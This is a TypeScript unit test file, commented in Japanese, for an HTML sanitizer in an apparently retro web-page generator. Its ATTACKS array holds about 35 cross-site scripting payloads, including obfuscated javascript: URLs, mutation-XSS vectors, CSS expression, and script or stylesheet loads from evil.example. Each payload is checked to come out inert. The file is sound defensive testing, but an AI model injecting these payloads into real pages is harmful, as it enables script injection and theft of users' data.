// 無害化と細かな振る舞いの単体テスト
import { parse, type DefaultTreeAdapterTypes as T } from "parse5";
import { describe, expect, it } from "vite-plus/test";
import { checkEra, type CheckOptions } from "../src/index.ts";

const page = (body: string, head = ""): string =>
  `<html><head><title>t</title>${head}</head><body>${body}</body></html>`;

const run = (body: string, opts: Partial<CheckOptions> = {}, head = ""): string =>
  checkEra(page(body, head), { year: 2003, mode: "local", ...opts }).html;

function elements(html: string): T.Element[] {
  const out: T.Element[] = [];
  const stack: T.Node[] = [parse(html)];
  while (stack.length > 0) {
    const node = stack.pop();
    if (!node || !("childNodes" in node)) continue;
    if ("tagName" in node) out.push(node);
    stack.push(...node.childNodes);
    if (node.nodeName === "template") stack.push((node as T.Template).content);
  }
  return out;
}

const FORBIDDEN_TAGS = new Set([
  "script",
  "iframe",
  "object",
  "embed",
  "svg",
  "math",
  "link",
  "base",
  "frame",
  "frameset",
]);
const URL_ATTRS = new Set(["href", "src", "background", "action", "formaction"]);

/** 出力をブラウザと同じく解析し直し、スクリプトが動く経路が残っていないことを確かめる */
function expectInert(html: string): void {
  for (const el of elements(html)) {
    expect(FORBIDDEN_TAGS.has(el.tagName), `<${el.tagName}> が残っている`).toBe(false);
    if (el.tagName === "meta") {
      expect(el.attrs.some((a) => a.name === "http-equiv" && /refresh/i.test(a.value))).toBe(false);
    }
    if (el.tagName === "input") {
      expect(el.attrs.some((a) => a.name === "type" && /password/i.test(a.value))).toBe(false);
    }
    for (const { name, value } of el.attrs) {
      expect(name.startsWith("on"), `${name} が残っている`).toBe(false);
      if (URL_ATTRS.has(name)) {
        // oxlint-disable-next-line no-control-regex -- ブラウザの URL 解析に合わせて制御文字を除く
        const cleaned = value.replace(/[\u0000-\u0020]/g, "").toLowerCase();
        expect(cleaned).not.toMatch(/^(javascript|vbscript):/);
        if (cleaned.startsWith("data:")) expect(cleaned).toMatch(/^data:image\//);
      }
      if (name === "style") expect(value).not.toMatch(/expression|image-set|https?:/i);
    }
  }
}

const ATTACKS = [
  `<script>alert(1)</script>`,
  `<SCRIPT SRC=//evil.example/x.js></SCRIPT>`,
  `<scr<script>ipt>alert(1)</script>`,
  `<img src=x onerror=alert(1)>`,
  `<body onload=alert(1)>`,
  `<a href="javascript:alert(1)">x</a>`,
  `<a href="JaVaScRiPt:alert(1)">x</a>`,
  `<a href=" &#14; javascript:alert(1)">x</a>`,
  `<a href="java&#x09;script:alert(1)">x</a>`,
  `<a href="&#106;avascript:alert(1)">x</a>`,
  `<a href="vbscript:msgbox(1)">x</a>`,
  `<a href="data:text/html,<script>alert(1)</script>">x</a>`,
  `<img src="data:text/html,<script>alert(1)</script>">`,
  `<table background="javascript:alert(1)"><tr><td>x</td></tr></table>`,
  `<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
  `<object data="evil.swf"></object><embed src="evil.swf">`,
  `<svg><script>alert(1)</script></svg>`,
  `<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
  `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
  `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`,
  `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
  `<template><script>alert(1)</script></template>`,
  `<style>a{background:url("javascript:alert(1)")}</style>`,
  `<style>p{content:"\\3c/style><script>alert(1)<\\/script>"}</style>`,
  `<p style="width:expression(alert(1))">x</p>`,
  `<p style="background:image-set('http://evil.example/x.png' 1x)">x</p>`,
  `<p style="background:url(http://evil.example/track.gif)">x</p>`,
  `<style>@import url(http://evil.example/x.css);</style>`,
  `<form action="http://evil.example/"><input type="password"><button formaction="javascript:alert(1)">x</button></form>`,
  `<base href="http://evil.example/">`,
  `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,
  `<frameset onload=alert(1)><frame src="javascript:alert(1)"></frameset>`,
  `<div data-anokoro-img="0" onmouseover="alert(1)">x</div>`,
  `<xmp><script>alert(1)</script></xmp>`,
  `<a href="http://evil.example/" onclick="alert(1)" style="position:fixed;top:0">x</a>`,
];

describe("攻撃文字列", () => {
  it.each(ATTACKS)("%s", (attack) => {
    for (const year of [1996, 2003, 2015]) {
      for (const mode of ["local", "net", "publish"] as const) {
        expectInert(run(attack, { year, mode }));
        expectInert(checkEra(attack, { year, mode }).html);
      }
    }
  });

  it("入れ子が非常に深くても止まらず、文字は残る", () => {
    const deep = `${"<div>".repeat(20000)}奥${"</div>".repeat(20000)}`;
    const result = checkEra(page(deep), { year: 2003, mode: "local" });
    expect(result.html).toContain("奥");
    expect(result.warnings.map((w) => w.ruleId)).toContain("html.too-deep");
  });

  it("使えないタグが大量にあっても時間がかからない", () => {
    const many = "<x>a</x>".repeat(50000);
    const started = performance.now();
    checkEra(page(many), { year: 2003, mode: "local" });
    expect(performance.now() - started).toBeLessThan(5000);
  });
});

describe("リンク", () => {
  it("相対パスと mailto はそのまま、外部リンクには rel を付ける", () => {
    const html = run(
      `<a href="diary.html">a</a><a href="mailto:a@example.com">b</a><a href="http://www.example.com/" rel="me">c</a><a href="//www.example.com/">d</a><a href="#top">e</a>`,
    );
    expect(html).toContain(`<a href="diary.html">a</a>`);
    expect(html).toContain(`<a href="mailto:a@example.com">b</a>`);
    expect(html).toContain(`<a href="http://www.example.com/" rel="nofollow ugc noopener">c</a>`);
    expect(html).toContain(`<a href="//www.example.com/" rel="nofollow ugc noopener">d</a>`);
    expect(html).toContain(`<a href="#top">e</a>`);
  });
});

describe("素材", () => {
  it("publish では素材配信の URL にし、カウンターは残す", () => {
    const result = checkEra(
      page(`<img src="img/KOJI.GIF"><!-- counter -->`, `<meta charset="Shift_JIS">`),
      { year: 2003, mode: "publish" },
    );
    expect(result.html).toContain(`<img src="/assets/koji.gif">`);
    expect(result.html).toContain("<!--COUNTER-->");
    expect(result.html).not.toContain("Shift_JIS");
    expect(result.assets.map((a) => a.kind)).toEqual(["img", "counter"]);
  });

  it("見つからない画像は壊れた画像にし、疑似バイト数は 300", () => {
    const result = checkEra(page(`<img src="nai.gif">`), { year: 2003, mode: "net" });
    expect(result.assets).toEqual([
      expect.objectContaining({ name: "nai.gif", fakeBytes: 300, kind: "img" }),
    ]);
    expect(result.warnings[0]?.topic).toBe("image");
  });

  it("net の BGM とカウンターは素材として返す", () => {
    const result = checkEra(page(`<bgsound src="midi/song.mid"><!--COUNTER-->`), {
      year: 2003,
      mode: "net",
      counter: 1234,
    });
    expect(result.assets).toEqual([
      { name: "song.mid", resolved: "♪ BGM再生中：song.mid", fakeBytes: 18000, kind: "bgm" },
      { name: "cgi-bin/count.cgi", resolved: "001234", fakeBytes: 2400, kind: "counter" },
    ]);
    expect(result.html).toContain(`data-anokoro-bgm="0">♪ BGMを読み込んでいます...</span>`);
    expect(result.html).toContain(`data-anokoro-ctr="1">------</span>`);
  });
});

describe("警告", () => {
  it("style 属性の宣言の位置を返す", () => {
    const source = `<html><body>\n<p style="color:red; border-radius:3px">x</p></body></html>`;
    const { warnings } = checkEra(source, { year: 2003, mode: "local" });
    expect(warnings[0]).toMatchObject({
      ruleId: "css.border-radius",
      topic: "css",
      locations: [{ line: 2, col: 22 }],
    });
  });

  it("同じ警告はまとめて数える", () => {
    const { warnings, score } = checkEra(page(`<script></script><script></script>`), {
      year: 2003,
      mode: "local",
    });
    expect(warnings).toHaveLength(1);
    expect(warnings[0]).toMatchObject({ count: 2, level: "note", topic: "js" });
    expect(score).toBe(97);
  });

  it("一部のブラウザだけが対応していた年は、文言を変える", () => {
    const { warnings } = checkEra(page(`<p style="border-radius:3px">x</p>`), {
      year: 2008,
      mode: "local",
    });
    expect(warnings[0]?.message).toBe(
      "「border-radius」は一部のブラウザでは使えましたが、主流のIEではまだ使えません",
    );
  });
});

describe("入力の検証", () => {
  it("対象外の年は受け付けない", () => {
    expect(() => checkEra("", { year: 1994, mode: "local" })).toThrow(RangeError);
    expect(() => checkEra("", { year: 2016, mode: "local" })).toThrow(RangeError);
  });

  it("タイトルの空白をまとめる", () => {
    expect(checkEra(`<title>  a \n b </title>`, { year: 2003, mode: "local" }).title).toBe("a b");
  });
});
